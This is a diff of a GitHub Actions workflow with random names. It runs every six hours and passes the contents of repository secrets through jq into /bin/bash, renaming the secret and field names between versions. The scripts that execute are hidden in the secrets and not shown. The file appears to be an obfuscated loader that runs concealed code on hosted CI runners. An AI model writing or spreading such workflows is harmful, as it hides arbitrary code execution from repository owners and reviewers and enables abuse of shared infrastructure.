@@ -1,8 +1,9 @@
 name: leidate7890
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 3/6 * * *'
+    - cron: '20 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,20 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: leidate7890
         env:
-          nz5: ${{ secrets.nz5 }}
+          wacdo9766: ${{ secrets.wacdo9766 }}
         run: |
-          echo $nz5 | jq -r .wtcrt38189 | /bin/bash
-          echo $pyqob1080 | jq -r .rrm2 | /bin/bash
-          echo $lq78471 | jq -r .n142 | /bin/bash
-          echo $jhss080 | jq -r .g59 | /bin/bash
-          echo $rw040 | jq -r .wvfyj08 | /bin/bash
-          echo $nlg6411 | jq -r .qwkdy271 | /bin/bash
-          echo $b7172 | jq -r .tps1274 | /bin/bash
-          echo $uxz9 | jq -r .dqwu9963 | /bin/bash
-          echo $tckkt738 | jq -r .x97220 | /bin/bash
-          echo $eyr16177 | jq -r .rdpz4 | /bin/bash
-          echo $hd4542 | jq -r .dq16937 | /bin/bash
-          echo $nfckh985 | jq -r .rrzl92 | /bin/bash
-          echo $eio81 | jq -r .pwdt17 | /bin/bash
-          echo $c5668 | jq -r .u97 | /bin/bash
+          echo $wacdo9766 | jq -r .o54863 | /bin/bash
+          echo $fzu0310 | jq -r .h96715 | /bin/bash
+          echo $q498 | jq -r .ie10 | /bin/bash
+          echo $tp356 | jq -r .f47576 | /bin/bash
+          echo $fbjyh28 | jq -r .fiev2 | /bin/bash
+          echo $gnnl1 | jq -r .rkub85115 | /bin/bash
+          echo $o706 | jq -r .e3545 | /bin/bash
+          echo $lvq218 | jq -r .ytnr086 | /bin/bash
+          echo $ovru15 | jq -r .qpig4378 | /bin/bash
+          echo $mdzua37 | jq -r .w9263 | /bin/bash
+          echo $aerc32884 | jq -r .jrd078 | /bin/bash
+          echo $sn13751 | jq -r .umo501 | /bin/bash
 
